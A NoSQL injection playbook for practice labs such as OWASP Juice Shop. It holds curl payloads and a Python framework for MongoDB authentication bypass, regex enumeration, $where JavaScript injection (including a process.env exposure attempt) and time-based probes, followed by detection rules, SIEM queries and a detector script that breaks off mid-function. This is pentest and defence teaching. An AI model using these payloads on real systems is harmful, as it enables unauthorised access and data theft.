# Playbook 12: NoSQL Injection Attacks

## Overview

This playbook covers comprehensive NoSQL injection testing targeting MongoDB, CouchDB, and other NoSQL databases. It includes authentication bypass, query injection, JavaScript injection, and operator injection techniques across OWASP Juice Shop, DVWA, XVWA, and WebGoat.

## Target Applications

- **OWASP Juice Shop**: MongoDB backend authentication and product queries
- **DVWA**: Custom NoSQL implementations
- **XVWA**: NoSQL database interactions
- **WebGoat**: NoSQL injection lessons and challenges

## Prerequisites

```bash
# Install required tools
pip3 install pymongo requests beautifulsoup4 urllib3
npm install -g nosql-injection-cli
brew install mongodb-community  # For testing MongoDB

# Clone NoSQL injection wordlists
git clone https://github.com/cr0hn/nosqlinjection_wordlists.git ~/nosql-wordlists
```

## Manual Testing Commands

### 1. MongoDB Authentication Bypass

```bash
# Basic NoSQL injection - authentication bypass
curl -X POST "http://10.30.0.237:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email": {"$ne": null}, "password": {"$ne": null}}'

# OR operator injection
curl -X POST "http://10.30.0.237:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email": {"$or": [{"email": "admin"}, {"email": "user"}]}, "password": {"$ne": null}}'

# Regex injection for username enumeration
curl -X POST "http://10.30.0.237:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email": {"$regex": "^admin.*"}, "password": {"$ne": null}}'
```

### 2. Query Parameter Injection

```bash
# URL parameter NoSQL injection
curl "http://10.30.0.237:3000/api/users?id[\$ne]=null"
curl "http://10.30.0.237:3000/api/users?username[\$regex]=^admin"
curl "http://10.30.0.237:3000/api/products?category[\$nin][]=electronics&category[\$nin][]=books"

# Array injection
curl "http://10.30.0.237:3000/api/search?filters[\$where]=this.price < 100"
curl "http://10.30.0.237:3000/api/search?filters[\$exists]=true"
```

### 3. JavaScript Injection (MongoDB)

```bash
# Where clause injection
curl -X POST "http://10.30.0.237:3000/api/search" \
  -H "Content-Type: application/json" \
  -d '{"query": {"$where": "this.username == \"admin\" || \"1\" == \"1\""}}'

# Function injection
curl -X POST "http://10.30.0.237:3000/api/search" \
  -H "Content-Type: application/json" \
  -d '{"query": {"$where": "function() { return this.username == \"admin\" || true; }"}}'

# Sleep injection for time-based testing
curl -X POST "http://10.30.0.237:3000/api/search" \
  -H "Content-Type: application/json" \
  -d '{"query": {"$where": "sleep(5000) || true"}}'
```

### 4. Operator Injection Testing

```bash
# $gt (greater than) operator
curl "http://10.30.0.237:3000/api/products?price[\$gt]=0"

# $lt (less than) operator
curl "http://10.30.0.237:3000/api/products?price[\$lt]=9999"

# $in operator with array
curl "http://10.30.0.237:3000/api/users?role[\$in][]=admin&role[\$in][]=user"

# $all operator
curl "http://10.30.0.237:3000/api/products?tags[\$all][]=electronics&tags[\$all][]=featured"

# $size operator
curl "http://10.30.0.237:3000/api/products?reviews[\$size]=5"
```

## Automated Python Script

```python
#!/usr/bin/env python3
"""
NoSQL Injection Testing Framework
Comprehensive NoSQL injection testing for MongoDB and other NoSQL databases
"""

import requests
import json
import time
import re
import urllib.parse
import threading
from concurrent.futures import ThreadPoolExecutor
import logging

class NoSQLInjectionTester:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        })
        self.results = []
        self.setup_logging()

    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('nosql_injection_results.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

    def test_mongodb_authentication_bypass(self, base_url="http://10.30.0.237:3000"):
        """Test MongoDB authentication bypass vulnerabilities"""
        self.logger.info("Testing MongoDB authentication bypass")

        login_url = f"{base_url}/rest/user/login"

        # NoSQL injection payloads for authentication bypass
        auth_bypass_payloads = [
            {"email": {"$ne": None}, "password": {"$ne": None}},
            {"email": {"$ne": ""}, "password": {"$ne": ""}},
            {"email": {"$gt": ""}, "password": {"$gt": ""}},
            {"email": {"$regex": ".*"}, "password": {"$regex": ".*"}},
            {"email": {"$exists": True}, "password": {"$exists": True}},
            {"email": {"$or": [{"email": "admin"}, {"email": "user"}]}, "password": {"$ne": None}},
            {"email": {"$where": "1==1"}, "password": {"$where": "1==1"}},
            {"email": {"$nin": [""]}, "password": {"$nin": [""]}},
            {"email": {"$not": {"$eq": ""}}, "password": {"$not": {"$eq": ""}}},
            {"email": {"$regex": "^admin.*", "$options": "i"}, "password": {"$ne": None}}
        ]

        for payload in auth_bypass_payloads:
            try:
                response = self.session.post(login_url, json=payload, timeout=10)

                if self.analyze_nosql_auth_response(response, payload):
                    self.results.append({
                        'url': login_url,
                        'payload': payload,
                        'type': 'auth_bypass',
                        'vulnerable': True,
                        'status_code': response.status_code,
                        'response_time': response.elapsed.total_seconds()
                    })
                    self.logger.warning(f"NoSQL auth bypass found: {payload}")

                time.sleep(0.5)  # Rate limiting

            except Exception as e:
                self.logger.error(f"Error testing auth bypass: {e}")

    def test_query_parameter_injection(self, base_url="http://10.30.0.237:3000"):
        """Test NoSQL injection in URL parameters"""
        self.logger.info("Testing NoSQL query parameter injection")

        test_endpoints = [
            "/api/users",
            "/api/products",
            "/rest/products/search",
            "/api/orders",
            "/api/search"
        ]

        # NoSQL operator injection payloads
        operator_payloads = [
            {"param": "id", "payload": {"$ne": None}},
            {"param": "username", "payload": {"$regex": "^admin"}},
            {"param": "price", "payload": {"$gt": 0}},
            {"param": "price", "payload": {"$lt": 9999}},
            {"param": "category", "payload": {"$in": ["electronics", "books"]}},
            {"param": "status", "payload": {"$nin": ["deleted"]}},
            {"param": "tags", "payload": {"$all": ["featured"]}},
            {"param": "created", "payload": {"$exists": True}},
            {"param": "reviews", "payload": {"$size": 5}},
            {"param": "data", "payload": {"$where": "this.id > 0"}}
        ]

        for endpoint in test_endpoints:
            url = f"{base_url}{endpoint}"

            for payload_data in operator_payloads:
                try:
                    # Test with different parameter encoding methods
                    params = self.encode_nosql_payload(payload_data["param"], payload_data["payload"])

                    response = self.session.get(url, params=params, timeout=10)

                    if self.analyze_nosql_query_response(response, payload_data):
                        self.results.append({
                            'url': url,
                            'payload': payload_data,
                            'type': 'query_injection',
                            'vulnerable': True,
                            'status_code': response.status_code,
                            'response_time': response.elapsed.total_seconds()
                        })
                        self.logger.warning(f"NoSQL query injection found: {endpoint} - {payload_data}")

                    time.sleep(0.5)

                except Exception as e:
                    self.logger.error(f"Error testing query injection: {e}")

    def test_javascript_injection(self, base_url="http://10.30.0.237:3000"):
        """Test JavaScript injection in NoSQL where clauses"""
        self.logger.info("Testing JavaScript injection in NoSQL queries")

        search_url = f"{base_url}/api/search"

        # JavaScript injection payloads
        js_payloads = [
            {"$where": "this.username == 'admin' || '1' == '1'"},
            {"$where": "function() { return this.price > 0 || true; }"},
            {"$where": "this.id > 0 || true"},
            {"$where": "sleep(5000) || true"},  # Time-based
            {"$where": "this.username.match(/admin/)"},
            {"$where": "Object.keys(this).length > 0"},
            {"$where": "this.constructor.constructor('return process.env')()"},  # Code execution attempt
            {"$where": "this.password.length > 0 || true"},
            {"$where": "JSON.stringify(this).indexOf('admin') >= 0"},
            {"$where": "eval('1+1') == 2"}
        ]

        for payload in js_payloads:
            try:
                # Test as POST JSON
                data = {"query": payload}
                response = self.session.post(search_url, json=data, timeout=15)

                if self.analyze_js_injection_response(response, payload):
                    self.results.append({
                        'url': search_url,
                        'payload': payload,
                        'type': 'javascript_injection',
                        'vulnerable': True,
                        'status_code': response.status_code,
                        'response_time': response.elapsed.total_seconds()
                    })
                    self.logger.warning(f"JavaScript injection found: {payload}")

                # Test as URL parameter
                params = {"where": json.dumps(payload)}
                response = self.session.get(search_url, params=params, timeout=15)

                if self.analyze_js_injection_response(response, payload):
                    self.results.append({
                        'url': search_url,
                        'payload': payload,
                        'type': 'javascript_injection_param',
                        'vulnerable': True,
                        'status_code': response.status_code,
                        'response_time': response.elapsed.total_seconds()
                    })

                time.sleep(1)  # Longer delay for JS injection

            except Exception as e:
                self.logger.error(f"Error testing JavaScript injection: {e}")

    def test_blind_nosql_injection(self, base_url="http://10.30.0.237:3000"):
        """Test blind NoSQL injection techniques"""
        self.logger.info("Testing blind NoSQL injection")

        login_url = f"{base_url}/rest/user/login"

        # Character-by-character username enumeration
        known_users = ["admin", "user", "test", "guest"]

        for username in known_users:
            self.logger.info(f"Testing blind injection for username: {username}")

            # Test each character position
            for i in range(len(username)):
                char = username[i]

                # Create regex pattern to match up to current character
                pattern = "^" + username[:i+1]

                payload = {
                    "email": {"$regex": pattern},
                    "password": {"$ne": None}
                }

                try:
                    response = self.session.post(login_url, json=payload, timeout=10)

                    # Check if response indicates valid username prefix
                    if response.status_code == 401:  # Unauthorized but user exists
                        self.logger.info(f"Valid username prefix found: {username[:i+1]}")
                    elif response.status_code == 200:  # Successful login bypass
                        self.results.append({
                            'url': login_url,
                            'payload': payload,
                            'type': 'blind_injection',
                            'vulnerable': True,
                            'discovered_username': username[:i+1]
                        })

                    time.sleep(0.2)

                except Exception as e:
                    self.logger.error(f"Error in blind injection test: {e}")

    def test_time_based_nosql_injection(self, base_url="http://10.30.0.237:3000"):
        """Test time-based blind NoSQL injection"""
        self.logger.info("Testing time-based NoSQL injection")

        search_url = f"{base_url}/api/search"

        # Time-based payloads
        time_payloads = [
            {"$where": "sleep(5000) || true"},
            {"$where": "this.id > 0 && sleep(5000)"},
            {"$where": "function() { var start = new Date(); while (new Date() - start < 5000); return true; }"},
            {"$where": "Date.now() + 5000 < Date.now() + 10000"},  # Logic to cause delay
        ]

        for payload in time_payloads:
            try:
                start_time = time.time()

                data = {"query": payload}
                response = self.session.post(search_url, json=data, timeout=15)

                end_time = time.time()
                response_time = end_time - start_time

                if response_time >= 4:  # Allow some tolerance
                    self.logger.warning(f"Time-based NoSQL injection detected! Response time: {response_time:.2f}s")
                    self.results.append({
                        'url': search_url,
                        'payload': payload,
                        'type': 'time_based_injection',
                        'vulnerable': True,
                        'response_time': response_time
                    })

                time.sleep(1)

            except requests.exceptions.Timeout:
                self.logger.warning("Request timeout - possible time-based injection")
            except Exception as e:
                self.logger.error(f"Error in time-based test: {e}")

    def encode_nosql_payload(self, param_name, payload):
        """Encode NoSQL operator payloads for URL parameters"""
        params = {}

        if isinstance(payload, dict):
            for operator, value in payload.items():
                if isinstance(value, list):
                    for i, item in enumerate(value):
                        params[f"{param_name}[{operator}][{i}]"] = item
                else:
                    params[f"{param_name}[{operator}]"] = value
        else:
            params[param_name] = payload

        return params

    def analyze_nosql_auth_response(self, response, payload):
        """Analyze authentication response for NoSQL injection indicators"""
        # Check for successful authentication bypass
        if response.status_code == 200:
            response_text = response.text.lower()

            # Look for authentication success indicators
            success_indicators = [
                "token",
                "authentication successful",
                "login successful",
                "welcome",
                "dashboard",
                "profile"
            ]

            for indicator in success_indicators:
                if indicator in response_text:
                    return True

        # Check for error messages that indicate injection worked
        error_indicators = [
            "invalid operator",
            "mongodb error",
            "nosql",
            "bson",
            "objectid"
        ]

        response_text = response.text.lower()
        for error in error_indicators:
            if error in response_text:
                return True

        return False

    def analyze_nosql_query_response(self, response, payload_data):
        """Analyze query response for NoSQL injection indicators"""
        # Check for successful data retrieval
        if response.status_code == 200:
            try:
                json_response = response.json()

                # Check if response contains data (successful injection)
                if isinstance(json_response, dict) and json_response.get('data'):
                    return True
                elif isinstance(json_response, list) and len(json_response) > 0:
                    return True
            except json.JSONDecodeError:
                pass

        # Check for NoSQL-specific error messages
        return self.check_nosql_errors(response)

    def analyze_js_injection_response(self, response, payload):
        """Analyze JavaScript injection response"""
        # Check for successful execution or errors
        if response.status_code == 200:
            try:
                json_response = response.json()
                if json_response:  # Any data returned might indicate successful injection
                    return True
            except json.JSONDecodeError:
                pass

        # Check response time for time-based payloads
        if "sleep" in str(payload) and response.elapsed.total_seconds() >= 4:
            return True

        return self.check_nosql_errors(response)

    def check_nosql_errors(self, response):
        """Check for NoSQL-specific error messages"""
        error_patterns = [
            r"mongodb.*error",
            r"invalid.*operator",
            r"bson.*error",
            r"nosql.*error",
            r"invalid.*regex",
            r"where.*function",
            r"eval.*error",
            r"javascript.*error"
        ]

        response_text = response.text.lower()

        for pattern in error_patterns:
            if re.search(pattern, response_text):
                return True

        return False

    def test_couchdb_injection(self, base_url="http://localhost:5984"):
        """Test CouchDB-specific injection techniques"""
        self.logger.info("Testing CouchDB injection techniques")

        # CouchDB view injection
        view_payloads = [
            {"key": {"$gt": None}},
            {"startkey": "\"", "endkey": "{}"},
            {"key": ["admin", {}]},
        ]

        # Test common CouchDB endpoints
        endpoints = [
            "/_all_dbs",
            "/_users/_all_docs",
            "/mydb/_all_docs",
        ]

        for endpoint in endpoints:
            url = f"{base_url}{endpoint}"

            for payload in view_payloads:
                try:
                    response = self.session.get(url, params=payload, timeout=10)

                    if response.status_code == 200:
                        self.logger.info(f"CouchDB endpoint accessible: {url}")
                        self.results.append({
                            'url': url,
                            'payload': payload,
                            'type': 'couchdb_injection',
                            'vulnerable': True,
                            'status_code': response.status_code
                        })

                    time.sleep(0.5)

                except Exception as e:
                    self.logger.error(f"Error testing CouchDB: {e}")

    def generate_report(self):
        """Generate comprehensive test report"""
        report = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'total_tests': len(self.results),
            'vulnerabilities_found': len([r for r in self.results if r.get('vulnerable')]),
            'vulnerability_types': {},
            'results': self.results
        }

        # Count vulnerability types
        for result in self.results:
            if result.get('vulnerable'):
                vuln_type = result.get('type', 'unknown')
                report['vulnerability_types'][vuln_type] = report['vulnerability_types'].get(vuln_type, 0) + 1

        # Save JSON report
        with open('nosql_injection_report.json', 'w') as f:
            json.dump(report, f, indent=2)

        # Generate HTML report
        html_report = self.generate_html_report(report)
        with open('nosql_injection_report.html', 'w') as f:
            f.write(html_report)

        self.logger.info(f"Report generated: {report['vulnerabilities_found']} vulnerabilities found")
        return report

    def generate_html_report(self, report):
        """Generate HTML vulnerability report"""
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>NoSQL Injection Test Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .header {{ background-color: #ff5722; color: white; padding: 10px; }}
                .summary {{ background-color: #f0f0f0; padding: 10px; margin: 10px 0; }}
                .vulnerability {{ background-color: #ffebee; border-left: 4px solid #f44336; padding: 10px; margin: 10px 0; }}
                .safe {{ background-color: #e8f5e8; border-left: 4px solid #4caf50; padding: 10px; margin: 10px 0; }}
                .payload {{ background-color: #f5f5f5; padding: 8px; margin: 5px 0; font-family: monospace; }}
                table {{ border-collapse: collapse; width: 100%; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                th {{ background-color: #f2f2f2; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>NoSQL Injection Security Assessment Report</h1>
                <p>Generated: {report['timestamp']}</p>
            </div>

            <div class="summary">
                <h2>Executive Summary</h2>
                <p><strong>Total Tests:</strong> {report['total_tests']}</p>
                <p><strong>Vulnerabilities Found:</strong> {report['vulnerabilities_found']}</p>
                <p><strong>Risk Level:</strong> {'HIGH' if report['vulnerabilities_found'] > 0 else 'LOW'}</p>

                <h3>Vulnerability Types</h3>
                <table>
                    <tr><th>Type</th><th>Count</th></tr>
        """

        for vuln_type, count in report['vulnerability_types'].items():
            html += f"<tr><td>{vuln_type.replace('_', ' ').title()}</td><td>{count}</td></tr>"

        html += """
                </table>
            </div>
        """

        for result in report['results']:
            if result.get('vulnerable'):
                html += f"""
                <div class="vulnerability">
                    <h3>NoSQL Injection Vulnerability - {result['type'].replace('_', ' ').title()}</h3>
                    <p><strong>URL:</strong> {result['url']}</p>
                    <p><strong>Method:</strong> {result.get('method', 'POST')}</p>
                    <div class="payload">
                        <strong>Payload:</strong><br>
                        <pre>{json.dumps(result['payload'], indent=2)}</pre>
                    </div>
                    <p><strong>Response Time:</strong> {result.get('response_time', 'N/A')}s</p>
                    <p><strong>Status Code:</strong> {result.get('status_code', 'N/A')}</p>
                </div>
                """

        html += """
        </body>
        </html>
        """

        return html

def main():
    tester = NoSQLInjectionTester()

    # Test various NoSQL injection techniques
    tester.test_mongodb_authentication_bypass()
    tester.test_query_parameter_injection()
    tester.test_javascript_injection()
    tester.test_blind_nosql_injection()
    tester.test_time_based_nosql_injection()

    # Test CouchDB if available
    # tester.test_couchdb_injection()

    # Generate final report
    report = tester.generate_report()

    print(f"\n{'='*60}")
    print("NOSQL INJECTION TEST COMPLETE")
    print(f"{'='*60}")
    print(f"Total vulnerabilities found: {report['vulnerabilities_found']}")
    print("\nVulnerability breakdown:")
    for vuln_type, count in report['vulnerability_types'].items():
        print(f"- {vuln_type.replace('_', ' ').title()}: {count}")
    print("\nReports saved:")
    print("- nosql_injection_report.json")
    print("- nosql_injection_report.html")
    print("- nosql_injection_results.log")

if __name__ == "__main__":
    main()
```

## Attack Detection and Monitoring

### Wireshark Detection Signatures

**Display Filter for NoSQL Injection Attempts:**

```
http contains "$ne" or
http contains "$gt" or
http contains "$lt" or
http contains "$regex" or
http contains "$where" or
http contains "$exists" or
http contains "$in" or
http contains "$nin" or
http contains "$or" or
http contains "$and" or
http.request.full_uri contains "%24ne" or
http.request.full_uri contains "%24gt" or
http.request.full_uri contains "%24where" or
urlencoded-form.value contains "$ne" or
urlencoded-form.value contains "$regex" or
json.value.string contains "$where"
```

**Advanced NoSQL Injection Detection:**

```
# JavaScript injection in NoSQL queries
http contains "function(" or http contains "sleep(" or http contains "this." or http contains "new Date"

# MongoDB specific operators
http contains "$size" or http contains "$type" or http contains "$mod" or http contains "$all"

# CouchDB specific injection patterns
http contains "_all_dbs" or http contains "_users" or http contains "startkey" or http contains "endkey"

# Time-based NoSQL injection
http.time > 5 and (http contains "sleep(" or http contains "while(" or http contains "Date()")
```

### Splunk Detection Queries

**Basic NoSQL Injection Detection:**

```spl
index=web_logs
| rex field=_raw "(?<nosql_operators>\$(?:ne|gt|lt|gte|lte|regex|where|exists|in|nin|or|and|not|all|size|type|mod))"
| where isnotnull(nosql_operators)
| eval injection_type=case(
    match(nosql_operators, "\$where"), "JavaScript Injection",
    match(nosql_operators, "\$regex"), "Regex Injection",
    match(nosql_operators, "\$ne|\$gt|\$lt"), "Operator Injection",
    match(nosql_operators, "\$exists|\$in|\$nin"), "Boolean Injection",
    1=1, "Generic NoSQL"
)
| stats count by src_ip, dest_ip, uri_path, injection_type, nosql_operators
| where count > 1
| sort -count
```

**MongoDB Authentication Bypass Detection:**

```spl
index=web_logs
| rex field=_raw "(?i)(?<auth_bypass>(\$ne.*null|\$gt.*\"\"|\$regex.*\.\*|\$exists.*true))"
| where isnotnull(auth_bypass) AND (uri_path LIKE "%login%" OR uri_path LIKE "%auth%")
| eval bypass_technique=case(
    match(auth_bypass, "\$ne.*null"), "Not Equal Null Bypass",
    match(auth_bypass, "\$gt.*\"\""), "Greater Than Empty Bypass",
    match(auth_bypass, "\$regex.*\.\*"), "Regex Wildcard Bypass",
    match(auth_bypass, "\$exists.*true"), "Exists Check Bypass",
    1=1, "Unknown Bypass"
)
| stats count, values(user_agent) as user_agents by src_ip, bypass_technique
| sort -count
```

**NoSQL JavaScript Injection Analytics:**

```spl
index=web_logs
| rex field=_raw "(?i)(?<js_injection>(function\s*\(|sleep\s*\(|this\.|new\s+Date|while\s*\(|eval\s*\())"
| where isnotnull(js_injection)
| eval js_risk=case(
    match(js_injection, "sleep\s*\("), 7,
    match(js_injection, "eval\s*\("), 9,
    match(js_injection, "function\s*\("), 6,
    match(js_injection, "while\s*\("), 8,
    1=1, 5
)
| eval risk_level=case(
    js_risk >= 8, "Critical",
    js_risk >= 6, "High",
    js_risk >= 4, "Medium",
    1=1, "Low"
)
| stats count, max(js_risk) as max_risk by src_ip, risk_level, uri_path
| sort -max_risk
```

**Time-based NoSQL Injection Detection:**

```spl
index=web_logs
| where response_time > 5000
| rex field=_raw "(?i)(?<time_injection>(sleep\s*\(|while.*Date|benchmark))"
| where isnotnull(time_injection)
| eval response_time_sec=response_time/1000
| stats avg(response_time_sec) as avg_response, count by src_ip, time_injection, uri_path
| where avg_response > 3
| sort -avg_response
```

### SIEM Integration

**QRadar AQL Query:**

```sql
SELECT
    sourceip,
    destinationip,
    "URL" as url,
    payload,
    eventcount,
    CASE
        WHEN payload ILIKE '%$where%' THEN 'JavaScript NoSQL Injection'
        WHEN payload ILIKE '%$ne%null%' THEN 'Authentication Bypass'
        WHEN payload ILIKE '%$regex%' THEN 'Regex NoSQL Injection'
        WHEN payload ILIKE '%$gt%$lt%' THEN 'Range Query Injection'
        ELSE 'Generic NoSQL Injection'
    END as injection_type
FROM events
WHERE
    devicetype = 12 AND
    (payload ILIKE '%$ne%' OR
     payload ILIKE '%$gt%' OR
     payload ILIKE '%$regex%' OR
     payload ILIKE '%$where%' OR
     payload ILIKE '%$exists%' OR
     payload ILIKE '%$in%' OR
     payload ILIKE '%$nin%')
    AND eventtime > NOW() - INTERVAL '1 HOUR'
ORDER BY eventtime DESC
LIMIT 100
```

**Elastic Stack Detection Rule:**

```json
{
  "query": {
    "bool": {
      "should": [
        {
          "regexp": {
            "http.request.body.content": ".*\\$(?:ne|gt|lt|regex|where|exists|in|nin).*"
          }
        },
        {
          "regexp": {
            "url.query": ".*\\$(?:ne|gt|lt|regex|where|exists).*"
          }
        },
        {
          "match_phrase": {
            "http.request.body.content": "function("
          }
        },
        {
          "regexp": {
            "http.request.body.content": ".*(sleep\\(|this\\.|new Date).*"
          }
        }
      ],
      "minimum_should_match": 1,
      "filter": [
        {
          "range": {
            "@timestamp": {
              "gte": "now-1h"
            }
          }
        }
      ]
    }
  }
}
```

### Network Security Monitoring

**Suricata Rules:**

```bash
# Basic NoSQL injection detection
alert http any any -> any any (msg:"NoSQL Injection - MongoDB Operators"; content:"$ne"; nocase; sid:2001; rev:1;)

alert http any any -> any any (msg:"NoSQL Injection - Regex Attack"; content:"$regex"; nocase; sid:2002; rev:1;)

alert http any any -> any any (msg:"NoSQL Injection - JavaScript Where Clause"; content:"$where"; nocase; sid:2003; rev:1;)

alert http any any -> any any (msg:"NoSQL Injection - Authentication Bypass"; content:"$ne"; nocase; content:"null"; distance:0; within:10; sid:2004; rev:1;)

alert http any any -> any any (msg:"NoSQL Injection - Boolean Operators"; content:"$exists"; nocase; sid:2005; rev:1;)

# Advanced NoSQL injection patterns
alert http any any -> any any (msg:"NoSQL Injection - Time-based Attack"; content:"sleep("; nocase; sid:2006; rev:1;)

alert http any any -> any any (msg:"NoSQL Injection - JavaScript Function"; content:"function("; nocase; sid:2007; rev:1;)

alert http any any -> any any (msg:"NoSQL Injection - CouchDB Attack"; content:"_all_dbs"; nocase; sid:2008; rev:1;)

alert http any any -> any any (msg:"NoSQL Injection - Array Operators"; content:"$in"; nocase; content:"$nin"; nocase; distance:0; within:50; sid:2009; rev:1;)
```

**Snort Rules:**

```bash
alert tcp any any -> any [80,443,8080,8443] (msg:"NoSQL Injection MongoDB Operator"; flow:established,to_server; content:"$ne"; nocase; classtype:web-application-attack; sid:2000001; rev:1;)

alert tcp any any -> any [80,443,8080,8443] (msg:"NoSQL Injection Where Clause"; flow:established,to_server; content:"$where"; nocase; classtype:web-application-attack; sid:2000002; rev:1;)

alert tcp any any -> any [80,443,8080,8443] (msg:"NoSQL Injection Regex Attack"; flow:established,to_server; content:"$regex"; nocase; classtype:web-application-attack; sid:2000003; rev:1;)
```

### Log Analysis Scripts

**MongoDB Log Analysis (Bash):**

```bash
#!/bin/bash

LOG_FILE="/var/log/mongodb/mongod.log"
ALERT_THRESHOLD=5
OUTPUT_FILE="/tmp/nosql_detection_$(date +%Y%m%d_%H%M%S).txt"

echo "NoSQL Injection Detection Analysis - $(date)" > "$OUTPUT_FILE"
echo "=============================================" >> "$OUTPUT_FILE"

# Detect NoSQL operator injection
echo -e "\n[+] NoSQL Operator Injection Attempts:" >> "$OUTPUT_FILE"
grep -E "\$ne|\$gt|\$lt|\$regex|\$where|\$exists" "$LOG_FILE" | tail -20 >> "$OUTPUT_FILE"

# Detect JavaScript injection in MongoDB
echo -e "\n[+] JavaScript Injection Attempts:" >> "$OUTPUT_FILE"
grep -E "function\(|sleep\(|this\.|eval\(" "$LOG_FILE" | tail -20 >> "$OUTPUT_FILE"

# Detect authentication bypass attempts
echo -e "\n[+] Authentication Bypass Attempts:" >> "$OUTPUT_FILE"
grep -E "\$ne.*null|\$gt.*\"\"|\$regex.*\.\*" "$LOG_FILE" | tail -20 >> "$OUTPUT_FILE"

# Check for suspicious query patterns
echo -e "\n[+] Suspicious Query Patterns:" >> "$OUTPUT_FILE"
grep -E "planSummary.*COLLSCAN" "$LOG_FILE" | wc -l >> "$OUTPUT_FILE"

echo "Analysis complete. Results saved to: $OUTPUT_FILE"
```

**Application Log Analysis (PowerShell):**

```powershell
param(
    [string]$LogPath = "C:\logs\application\",
    [int]$Hours = 24
)

$StartTime = (Get-Date).AddHours(-$Hours)
$OutputFile = "NoSQL_Detection_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"

"NoSQL Injection Detection Analysis - $(Get-Date)" | Out-File $OutputFile
"=============================================" | Out-File $OutputFile -Append

# Get recent log files
$LogFiles = Get-ChildItem $LogPath -Filter "*.log" | Where-Object {$_.LastWriteTime -gt $StartTime}

foreach ($LogFile in $LogFiles) {
    $Content = Get-Content $LogFile.FullName

    # NoSQL operator attacks
    $OperatorAttacks = $Content | Select-String -Pattern "\$(?:ne|gt|lt|regex|where|exists)" -AllMatches
    if ($OperatorAttacks) {
        "`n[+] NoSQL Operator Injection in $($LogFile.Name):" | Out-File $OutputFile -Append
        $OperatorAttacks | Select-Object -First 10 | Out-File $OutputFile -Append
    }

    # JavaScript injection
    $JSAttacks = $Content | Select-String -Pattern "(function\(|sleep\(|this\.|eval\()" -AllMatches
    if ($JSAttacks) {
        "`n[+] JavaScript Injection in $($LogFile.Name):" | Out-File $OutputFile -Append
        $JSAttacks | Select-Object -First 10 | Out-File $OutputFile -Append
    }

    # Authentication bypass
    $AuthBypass = $Content | Select-String -Pattern "(\$ne.*null|\$gt.*\"\")" -AllMatches
    if ($AuthBypass) {
        "`n[+] Authentication Bypass in $($LogFile.Name):" | Out-File $OutputFile -Append
        $AuthBypass | Select-Object -First 10 | Out-File $OutputFile -Append
    }
}

Write-Host "Analysis complete. Results saved to: $OutputFile"
```

### Python Behavioral Detection Script

```python
#!/usr/bin/env python3
"""
NoSQL Injection Attack Detection and Analysis System
Real-time monitoring for MongoDB, CouchDB, and other NoSQL databases
"""

import re
import json
import time
import sqlite3
import hashlib
from datetime import datetime, timedelta
from collections import defaultdict, Counter
from urllib.parse import unquote
import logging

class NoSQLInjectionDetector:
    def __init__(self, db_path="nosql_detection.db"):
        self.db_path = db_path
        self.setup_database()
        self.setup_logging()

        # NoSQL injection patterns
        self.patterns = {
            'mongodb_operators': [
                r'\$ne\b',
                r'\$gt\b',
                r'\$lt\b',
                r'\$gte\b',
                r'\$lte\b',
                r'\$regex\b',
                r'\$where\b',
                r'\$exists\b',
                r'\$in\b',
                r'\$nin\b',
                r'\$or\b',
                r'\$and\b',
                r'\$not\b',
                r'\$size\b',
                r'\$type\b',
                r'\$mod\b',
                r'\$all\b'
            ],
            'javascript_injection': [
                r'function\s*\(',
                r'sleep\s*\(',
                r'this\.',
                r'new\s+Date',
                r'while\s*\(',
                r'for\s*\(',
                r'eval\s*\(',
                r'setTimeout\s*\(',
                r'setInterval\s*\('
            ],
            'auth_bypass': [
                r'\$ne.*null',
                r'\$gt.*""',
                r'\$regex.*\.\*',
                r'\$exists.*true',
                r'\$nin.*\[\]'
            ],
            'couchdb_injection': [
                r'_all_dbs',
                r'_users',
                r'_config',
                r'_stats',
                r'startkey.*endkey',
                r'reduce=false'
            ],
            'time_based': [
                r'sleep\s*\(\s*\d+',
                r'while.*Date.*getTime',
                r'setTimeout.*\d+',
                r'new\s+Date.*while'
            ]
        }

        # Detection thresholds
        self.thresholds = {
            'operators_per_request': 3,
            'requests_per_minute': 15,
            'unique_operators_per_ip': 8,
            'time_window': 300,  # 5 minutes
            'response_time_threshold': 3.0  # seconds
        }

        # Tracking data
        self.ip_activity = defaultdict(list)
        self.operator_usage = defaultdict(list)

    def setup_database(self):
        """Initialize SQLite database for tracking"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS nosql_attempts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                source_ip TEXT,
                target_url TEXT,
                payload TEXT,
                injection_type TEXT,
                operators_used TEXT,
                risk_score INTEGER,
                response_time REAL,
                blocked BOOLEAN
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS operator_stats (
                operator TEXT PRIMARY KEY,
                usage_count INTEGER,
                last_seen TEXT,
                associated_ips TEXT
            )
        ''')

        conn.commit()
        conn.close()

    def setup_logging(self):
        """Configure logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('nosql_detector.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

    def analyze_request(self, request_data):
        """
        Analyze HTTP request for NoSQL injection patterns

        Args:
            request_data (dict): Contains 'ip', 'url', 'params', 'body', 'headers', 'response_time'

        Returns:
            dict: Analysis results
        """
        source_ip = request_data.get('ip')
        url = request_data.get('url', '')
        params = request_data.get('params', {})
        body = request_data.get('body', '')
        response_time = request_data.get('response_time', 0)

        # Combine all input data
        combined_input = f"{url} {json.dumps(params)} {body}"
        decoded_input = unquote(combined_input)

        detection_results = {
            'timestamp': datetime.now().isoformat(),
